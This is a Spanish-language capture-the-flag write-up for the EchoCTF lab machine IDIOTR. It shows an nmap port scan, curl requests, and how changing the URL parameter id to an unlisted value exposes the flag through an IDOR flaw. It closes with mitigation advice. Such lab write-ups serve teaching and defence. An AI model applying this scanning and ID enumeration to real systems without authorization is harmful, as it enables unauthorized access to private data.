# **IDIOTR**


![idiotr1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/IDIOTR/idiotr1.png)
## **Introducción**

La máquina **IDIOTR** de **EchoCTF** presenta un reto web que oculta una única bandera, la cual se puede obtener al explotar una vulnerabilidad del tipo **IDOR** (*Insecure Direct Object References* o Referencias Inseguras a Objetos Directos). Esta clase de vulnerabilidad permite acceder a recursos que normalmente deberían estar restringidos, simplemente manipulando parámetros en la URL.

**IP:** `10.0.41.2`

---

## **Reconocimiento y Escaneo**

Comenzamos el reconocimiento de la máquina **IDIOTR** con un escaneo de puertos utilizando **Nmap**. El comando utilizado fue:

```bash
nmap -sSC -vv -p- 10.0.41.2
```

**Resultado:**
```
PORT     STATE SERVICE REASON
1337/tcp open  waste   syn-ack ttl 63
```

El puerto **1337** se encuentra abierto. Al realizar una conexión HTTP a la IP `10.0.41.2` en dicho puerto, se carga una página web con una interfaz básica, donde encontramos un menú con diferentes secciones: *Home*, *About*, *Blogs* y *Secret*.

![iditr2](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/IDIOTR/idiotr2.png)

---

## **Inspección del Código Fuente**

Usamos `curl` para verificar el contenido del sitio web desde la terminal:

```bash
curl http://10.0.41.2:1337/
```

Dentro del código fuente se observa el siguiente patrón de navegación:

```html
<a class="nav-link" href="/">Home</a>
<li class="nav-item active">
  <a class="nav-link" href="/?id=2">About</a>
</li>
<li class="nav-item active">
  <a class="nav-link" href="/?id=3">Blogs</a>
</li>
<li class="nav-item active">
  <a class="nav-link" href="/?id=4">Secret</a>
</li>
```

Esto indica que el sitio gestiona el contenido mediante una variable `id`, lo cual es un patrón típico de **IDOR**. Las secciones visibles van desde `id=2` hasta `id=4`.

---

## **Exploración de IDOR**

Probamos buscar cadenas relacionadas con la bandera utilizando `curl` y `grep` para extraer líneas relevantes:

```bash
curl http://10.0.41.2:1337/?id=4 | grep "ETSCTF"
```

Tras probar los valores conocidos (`id=2` al `id=4`) sin obtener resultados, decidimos probar otros valores no listados, como `id=1`:

```bash
curl http://10.0.41.2:1337/?id=1 | grep "ETSCTF"
```

**Respuesta:**
```SHELL 
<p>Now You know why its called Insecure Direct Object Reference ETSCTF_DDDDDDDDDDDDDDDDDDDDDD</p>
```

Con esto confirmamos que el parámetro `id` no está validado adecuadamente, y se puede manipular directamente para acceder a información sensible.

---

## **Identificación de Vulnerabilidades**

La vulnerabilidad identificada es una **IDOR (Insecure Direct Object Reference)**. Este tipo de falla ocurre cuando el sistema permite acceder directamente a objetos mediante identificadores predecibles o manipulables (por ejemplo, `id=1`, `id=2`, etc.), sin verificar si el usuario está autorizado para ver ese contenido.

Esta exposición permite que un atacante acceda a información confidencial simplemente modificando el valor de un parámetro en la URL, como ocurrió en este caso.

---

## **Medidas de Mitigación**

Para evitar vulnerabilidades del tipo IDOR, se deben seguir las siguientes buenas prácticas:

- **Control de Acceso a Nivel de Objeto:** No basta con ocultar recursos. Es fundamental verificar si el usuario tiene permisos para acceder al recurso solicitado, incluso si la solicitud parece válida.

- **Validación de Parámetros:** Los valores pasados por URL deben ser validados rigurosamente antes de procesar la petición.

- **Uso de identificadores no predecibles:** Evitar el uso de valores secuenciales (`id=1`, `id=2`, etc.). En su lugar, utilizar identificadores UUID u otras estrategias que dificulten el acceso arbitrario.

- **Registros y alertas:** Monitorear el acceso a parámetros críticos y generar alertas ante comportamientos anómalos, como exploraciones de múltiples IDs.

```c
Writeup Made With ❤️ By SheepsStealer
```